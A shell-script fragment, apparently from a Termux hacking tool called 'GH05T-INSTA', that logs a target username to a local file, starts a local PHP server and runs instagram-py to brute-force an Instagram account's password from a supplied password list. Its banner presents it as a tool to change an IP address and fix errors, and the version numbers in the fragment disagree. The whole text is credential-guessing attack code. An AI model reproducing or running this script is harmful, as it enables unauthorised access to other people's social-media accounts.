		clear 
		banners
		cd /data/data/com.termux/files/usr/cookies >/dev/null 2>&1
		php -S 127.0.0.1:4444 > /dev/null 2>&1 &
		sleep 1
		echo "  User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
		echo -e "${restar}GH05T-INSTA 3.01 , gh05t tool helps you to automatically change your IP address and fix errors." 
		instagram-py --username $2 --password-list $4
		xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
		reopens
		sleep 3
		echo -e " \033[1;37m +----------------------------------------------+"
		echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m  version\033[1;37m  :\033[0;34m 7.01\033[1;37m|"
